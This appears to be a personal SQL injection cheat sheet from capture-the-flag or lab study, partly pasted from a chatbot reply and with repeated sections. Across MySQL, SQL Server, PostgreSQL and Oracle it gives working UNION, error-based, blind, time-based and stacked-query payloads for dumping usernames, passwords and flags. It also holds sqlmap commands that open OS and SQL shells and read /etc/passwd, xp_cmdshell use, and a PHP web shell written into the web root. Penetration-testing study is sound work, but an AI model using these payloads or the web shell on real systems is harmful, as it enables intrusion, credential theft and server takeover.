When we write a SELECT query, we need to specify what data we want and where we want it from. The "what" is formatted as a list of one or more columns. We can also use an asterisk (*) as a wildcard to query for all columns in a table. The "where" indicates which tables we want to use. We'll start with a basic example that selects data from one table.

```sql
SELECT * FROM menu;
```

We can use the version() function to retrieve the version of a MySQL database.

```sql
select version();
```

We can obtain the user account currently connected to a MySQL database with the current_user() or system_user() functions. We should keep in mind that this is a user account for the database, and does not necessarily correspond to an OS-level user.

```sql
select current_user();
```

For cases in which we need to extract information with a SELECT statement, we can query the tables table in the information_schema. In this example, we included a GROUP BY clause to return only one record for each unique value in the table_schema column.

```sql
select table_schema from information_schema.tables group by table_schema;
```

We can obtain a list of databases from the databases table in the system catalog, abbreviated as sys in queries. The system catalog contains metadata about the database.

```sql
SELECT name FROM sys.databases;
```

We can obtain a list of table names within a database by querying the tables table in the corresponding information_schema. In current versions of SQL Server, we can also query app.sys.tables for the same information.

```sql
select * from app.information_schema.tables;
```

Once we know a table's name, we can query the columns table in the information_schema to obtain its column names.

```sql
select COLUMN_NAME, DATA_TYPE from app.information_schema.columns where TABLE_NAME = 'menu';
```

This will show you all tables in the app database — no line breaks, just one clean line.

```sql
SELECT * FROM app.information_schema.tables;
```

Since you already know your Table exists, just do:

```sql
SELECT * FROM app.dbo.nameTable;
```

Or if you're already using app as your current DB (most likely), this is enough:

```sql
SELECT * FROM dbo.nameTable;
```

---

# **SQL Injection Techniques Summary**

## **1. General SQL Injection Techniques**

### **1.1 Basic SQL Injection**

Injections manipulate input to interfere with SQL queries:

```sql
' OR 1=1 --
```

- `'` closes a string, `OR 1=1` always evaluates to true, and `--` comments out the rest of the query.
- This can bypass authentication or display all records in a table.

### **1.2 UNION-Based SQL Injection**

Union injection combines the results of multiple `SELECT` queries:

```sql
' UNION SELECT null, username, password FROM users --
```

- Here, you try to union data from the `users` table to display usernames and passwords.

### **1.3 Error-Based SQL Injection**

Error-based injection leverages database errors to gain information about the database structure:

```sql
' AND 1=CONVERT(int, (SELECT @@version)) --
```

- This can extract sensitive information such as the database version or table structure.

### **1.4 Blind SQL Injection**

When the application doesn’t show error messages, you use boolean conditions to infer information:

```sql
' AND 1=1 --   # True, check for valid response
' AND 1=2 --   # False, no response
```

By determining when a condition is true or false, you can infer database information.

### **1.5 Time-Based Blind SQL Injection**

This uses time delays to infer data:

```sql
' AND SLEEP(5) -- 
```

If the application delays for 5 seconds, you know the query executed successfully.

---

## **2. MySQL Specific SQL Injection**

### **2.1 Retrieving Database Information**

MySQL allows you to retrieve database information using the `INFORMATION_SCHEMA` tables:

```sql
SELECT DATABASE();  -- Get current database name
SHOW TABLES;  -- Get list of tables
SHOW COLUMNS FROM table_name;  -- Get columns of a table
```

### **2.2 Dumping the Flag**
To dump all data from a table (e.g., `users` table):
```sql
' UNION SELECT null, username, password FROM users --
```

### **2.3 MySQL Specific Functions**
- `@@version` – Get MySQL version.
- `GROUP_CONCAT()` – Combine multiple row values into a single string:
```sql
' UNION SELECT GROUP_CONCAT(username, ':', password) FROM users --
```

---

## **3. Oracle Specific SQL Injection**

### **3.1 Retrieving Database Information**

In Oracle, `ALL_TABLES` and `USER_TABLES` can list tables:

```sql
SELECT table_name FROM all_tables;  -- List all tables
SELECT * FROM user_tables;  -- List tables for the current user
```

### **3.2 Oracle Functions**

- `USER` – Get the current database user.

- `DBMS_METADATA.GET_DDL` – Get table DDL (schema definitions).
```sql
SELECT DBMS_METADATA.GET_DDL('TABLE', 'table_name') FROM dual;
```

### **3.3 Accessing Hidden Tables**

```sql
SELECT * FROM SYS.HIDDENSECRETTABLE;
```

Oracle uses `SYS` schema for system-level tables.

### **3.4 Extracting Data**

```sql
' UNION SELECT null, username, password FROM users --
```

### **3.5 Oracle Specific Injection for System Tables**

You can use `SYS.DUAL` to bypass security restrictions:

```sql
SELECT * FROM SYS.DUAL;
```

---

## **4. PostgreSQL Specific SQL Injection**

### **4.1 Retrieving Database Information**

PostgreSQL stores system information in `pg_catalog`:

```sql
SELECT current_database();  -- Get current database
SELECT table_name FROM information_schema.tables;  -- List all tables
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';  -- Get columns of users table
```

### **4.2 PostgreSQL Functions**

- `pg_user` – Retrieves user information.

```sql
  SELECT * FROM pg_user;
```

- `version()` – Get PostgreSQL version:

```sql
SELECT version();
```

### **4.3 Blind SQL Injection (PostgreSQL)**

PostgreSQL supports error-based and time-based techniques for blind injections:

```sql
' AND 1=1 --  -- Always true
' AND 1=2 --  -- Always false
```

### **4.4 UNION-Based Injection**

PostgreSQL can also use the `UNION` keyword to combine query results:

```sql
' UNION SELECT null, username, password FROM users --
```

---

## **5. SQL Server (MS SQL) Specific SQL Injection**

### **5.1 Retrieving Database Information**

In SQL Server, use `INFORMATION_SCHEMA` to get table info:

```sql
SELECT DATABASE();  -- Get current database name
SELECT * FROM INFORMATION_SCHEMA.TABLES;  -- Get all tables
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users';  -- Get columns of the users table
```

### **5.2 SQL Server Functions**

- `@@version` – Get SQL Server version:

```sql
SELECT @@version;
```

- `sysobjects` – List all tables in the database:

```sql
SELECT name FROM sysobjects WHERE type = 'U';  -- List user tables
```

- `xp_cmdshell` – Execute system commands (if enabled):

```sql
EXEC xp_cmdshell('dir');  -- Get system directory
```

### **5.3 SQL Server Blind Injection**

Just like MySQL and Oracle, you can use **blind injection** to infer information by checking responses:

```sql
' AND 1=1 --  -- True
' AND 1=2 --  -- False
```

### **5.4 Time-Based Blind Injection in SQL Server**

```sql
' WAITFOR DELAY '00:00:05' --  -- Delay execution for 5 seconds
```

### **5.5 UNION Injection**

```sql
' UNION SELECT null, username, password FROM users --
```

---

## **6. General SQL Injection Protection Methods**

To prevent SQL Injection, ensure:
1. **Use Prepared Statements** – Always bind user input to avoid injection.
2. **Use ORM (Object-Relational Mapping) Libraries** – These libraries automatically prevent most SQL injection techniques.
3. **Validate and Sanitize Input** – Reject inputs containing `'`, `"`, `--`, `;`, `/*`, etc.
4. **Least Privilege Principle** – Restrict database access rights as much as possible (e.g., avoid using high-privilege accounts for web applications).
5. **Error Handling** – Avoid showing detailed database error messages to the user.

---

## **Conclusion**
By learning and understanding the above commands for each database, you can:
- **Identify vulnerable points** in an application.
- **Test** different techniques to inject SQL code.
- **Exploit** poorly-secured systems for educational and ethical hacking purposes (CTFs, security testing).

Always remember that SQL Injection is illegal unless you have explicit permission (ethical hacking or CTF challenges).

If you need more details or have specific questions about a database, let me know! 

---

Feel free to copy and paste this directly into your notes! If you need more detailed examples or clarification on any point, don’t hesitate to ask.


mySQL

```sql
select version();
```

```sql
select current_user();
```

```sql
select table_schema from information_schema.tables group by table_schema;
```

```sql
select table_name from information_schema.tables where table_schema = 'app';
```

```sql
select column_name, data_type from information_schema.columns where table_schema = 'app' and table_name = 'menu';
```

Microsoft SQL Server

```sql
select @@version;
```

```sql
SELECT SYSTEM_USER;
```

```sql
SELECT name FROM sys.databases;
```

```sql
select * from app.information_schema.tables;
```

```sql
select COLUMN_NAME, DATA_TYPE from app.information_schema.columns where TABLE_NAME = 'menu';
```

PostgreSQL

```sql
select version();
```

```sql
select current_user;
```

```sql
select datname from pg_database;
```

```sql
select table_name from app.information_schema.tables where table_schema = 'public';
```

```sql
select column_name, data_type from app.information_schema.columns where table_name = 'menu';
```

Oracle

```sql
select * from v$version;
```

```sql
select user from dual;
```

```sql
select owner from all_tables group by owner;
```

```sql
select table_name from all_tables where owner = 'SYS' order by table_name;
```

```sql
select column_name, data_type from all_tab_columns where table_name = 'MENU';
```


### Error Base SQL Injection (SQL SERVER)

Errorbase
MySQL 

```sql
extractvalue('',concat('>',version()))
```

SQL Server 

```sql
cast(@@version as integer)
```

```sql
cast((SELECT name FROM sys.databases
WHERE database_id = 1;) as int)
```

```sql
cast((SELECT TOP 1 flag FROM App.dbo.flags;) as int);
```

```sql
CAST((SELECT name 
FROM app.sys.tables 
ORDER BY name
OFFSET 2 ROWS FETCH NEXT 1 ROWS ONLY) AS INT);
```

Tips:

    Keep incrementing the OFFSET to walk through the table names.

    Use a script if possible to automate it.

    Make note of each table name from the error message.

```sql
CAST((SELECT name FROM app.sys.tables ORDER BY name OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY) AS INT)
```


```sql
CAST((
  SELECT name 
  FROM app.sys.columns 
  WHERE object_id = OBJECT_ID('app.dbo.flags')
  ORDER BY name
  OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY
) AS INT)
```

```sql
CAST((SELECT name FROM target.sys.tables WHERE name LIKE '%flag%';) as int)
```

```sql
CAST((
  SELECT name 
  FROM target.sys.columns 
  WHERE object_id = OBJECT_ID('target.dbo.flags')
  ORDER BY name
  OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY
) AS INT)
```

```sql
CAST((
  SELECT TOP 1 flag 
  FROM target.dbo.flags
) AS INT)
```

PostgreSQL 

```sql
cast(version() as integer)
```

Oracle 
```sql
to_char(dbms_xmlgen.getxml('select "'|| (select substr(banner,0,30) from v$version where rownum=1)||'" from sys.dual'))
```

### UNION-Based & Database Detection Notes

#### Purpose
To detect and exploit UNION-based SQL Injection vulnerabilities and identify the backend database (MySQL, SQL Server, Oracle, PostgreSQL).

---

```sql
' order by 1--
```

#### or for burp 
Always URL encode your payload if you paste it into Burp:

    - ' → %27

    - Space → %20

    - -- - → %2D%2D%20-

```sql
%25%27+order+by+4+--
```

```sql
' union select 111, 222, 333, 444---
```

```sql
a' union select 111, username, password, 444 from usser--
```

```sql
' UNION SELECT NUll, table_name, NULL FROM information_schema.tables--
```

Get current DB user (check for admin permissions)

```sql
')) UNION SELECT 1, user(), '', 1 -- -
```

Enumerate databases

```sql
')) UNION SELECT 1, schema_name, '', 1 FROM information_schema.schemata -- -
```

Enumerate tables inside a target DB

```sql
')) UNION SELECT 1, table_name, '', 1 FROM information_schema.tables WHERE table_schema='target_db' -- -
```

List All Columns in a Table

```sql
')) UNION SELECT 1, column_name, '', 1 FROM information_schema.columns WHERE table_name='target_table' -- -
```

Enumerate columns in a specific table

```sql
')) UNION SELECT 1, column_name, '', 1 FROM information_schema.columns WHERE table_name='target_table' -- -
```

```sql
')) UNION ALL SELECT 1, column_name, "", 1 FROM information_schema.columns WHERE table_name='targetTable' -- -
```

```sql
')) UNION SELECT 1, column_name, '', 1 FROM information_schema.columns WHERE table_name='targetTable' AND column_name='flag' -- -
```

```sql
')) UNION SELECT 1, CONCAT(table_name, '.', column_name), '', 1 FROM information_schema.columns WHERE table_schema='target' -- -
``` 

```sql
')) UNION ALL SELECT 1, flag, '', 1 FROM app.targetTable -- -
``` 

### Stacked Queries

How Stacked Queries Work

Normally, SQL queries sent to a database are supposed to be single, complete commands.
But if an application is vulnerable and does not properly sanitize input, an attacker might inject something like:

; separates two queries.

The first query runs and returns something.

Then the second query executes and deletes the users table.

### Optional
if allowed

```shell
sqlmap -u "http://example.com/page.php?id=1" --level=5 --risk=3 --batch --dbs
```

It can test all types: error-based, boolean-based, time-based — and auto-detect the backend.

show all tables

```sql
target';select * from pg_tables-- -
```

PostgreSQL stores all table metadata in the pg_tables system view.

```sql
target; SELECT tablename FROM pg_tables WHERE schemaname='public'; --
```

Once you've identified a suspicious table (e.g., table), inspect its columns with:

```sql
target; SELECT column_name FROM information_schema.columns WHERE table_name='table'; --
```

Now that you know the table and the column, extract the data with a final stacked query:

```sql
target; SELECT flag FROM flag_table; --
```

```sql
target; SELECT flag FROM flag_table; --
```

### SQLMAP

```shell
sqlmap -u "http://sql-injection/exploit/stacked" --technique=S --dbms=PostgreSQL --risk=3 --level=5 --batch
```

#### Breakdown of the Options

Option	Purpose
--
- -u	Target URL
- ?id=rug	The vulnerable parameter id with test input rug
- --technique=S	Only use Stacked queries (S)
- --dbms=PostgreSQL	Assume backend is PostgreSQL (helps optimize payloads)
- --risk=3 --level=5	Enables more aggressive payloads and parameter coverage
- --batch	Auto-confirms prompts for non-interactive use
- --time-sec=5 → helps detect time-based blind SQLi (e.g., via pg_sleep)
- --flush-session → forces sqlmap to retry scanning from scratch
- --data="username=rug" Sends this as the POST body
- -r: tells sqlmap to read a raw HTTP request file

By default, sqlmap tests all parameters (name, sort, order). If only one is vulnerable, you can narrow it down:

- -p name

Some apps reject POST without Content-Type: application/x-www-form-urlencoded. Add it like so:

- --headers="Content-Type: application/x-www-form-urlencoded"

Once sqlmap confirms a vulnerability, you can use:

```shell
sqlmap -u "http://target.url/?id=rug" --sql-shell
```

This gives you a live SQL shell — anything you type will be executed directly on the database. For example:

Read files from disk:

- --file-read=/etc/passwd

Write files (webshells, payloads):

- --file-write=backdoor.php --file-dest=/var/www/html/shell.php

Execute OS commands:

- --os-shell

#### Send to sqlmap (optional)

```shell
sqlmap -r burp_request.txt --batch --risk=3 --level=5 --technique=S
```

### URL-Encoded

    - ;	                %3B
    - space ( )	        %20
    - ' (single quote)	%27
    - =	                %3D
    - -- (comment) 	    -- or --+

### Reading and Writing Files

```sql
create table tmp(data text);
copy tmp from '/etc/passwd';
select * from tmp;
```

The pg_read_file() function reads files on the server filesystem (not client-side) and has the following valid forms:

```sql
pg_read_file(filename text [, offset integer, length integer [, missing_ok boolean]])
```

- filename: path relative to the data directory (you can't read arbitrary files).
- offset (optional): start position in bytes.
- length (optional): number of bytes to read.
- missing_ok (optional, PostgreSQL 13+): if true, returns NULL instead of error if file doesn't exist.

```sql
SELECT pg_read_file('postgresql.conf');  -- read full file
SELECT pg_read_file('postgresql.conf', 0, 1000);  -- first 1000 bytes
SELECT pg_read_file('postgresql.conf', 0, 1000, true);  -- ignore if missing
```

Only superusers can use pg_read_file(). If you run this as a normal user, you'll get a permission denied error.

In MySQL, we can read files using the LOAD_FILE() function. However, there is a catch. MySQL has a secure_file_priv system variable that restricts which directories can be used to read or write files. Some versions of MySQL do not set this variable by default, which means MySQL can potentially read or write any file (subject to OS file permissions). Setting the value to an empty string ("") is the same as leaving the value blank. Other versions, or hardened configurations, will set this variable to a specific directory. We can check the value of this variable with

```sql
SELECT @@GLOBAL.secure_file_priv;
```

```sql
SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/test.txt'
```

```sql
SELECT LOAD_FILE('/var/lib/mysql-files/test.txt')
```

### Remote code execution

Here’s an example command to perform Error-based SQL Injection using SQLmap:

```shell
sqlmap -u "http://example.com/vulnerable.php?id=1" --technique E --dump
```

This command specifies the target URL and injection point using the -u option, the Error-based SQL Injection technique using the --technique option, and the --dump option to extract data from the database.

```shell
sqlmap -u "http://example/index.php?id=8" --tables --batch
```

```shell
sqlmap -u "http://example/index.php?id=8" -D extramile -T flags --columns --batch
```

```shell
sqlmap -u "http://example/page.php?id=8" --privileges --current-user
```

shell.php

```shell
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
```

    - http://target.com/shell.php?cmd=whoami

```shell
sqlmap -u "http://target.com/page.php?id=1" \
--file-write="shell.php" \
--file-dest="/var/www/html/shell.php" \
--batch
```

```shell
cp /root/flag.txt /var/www/html/
```


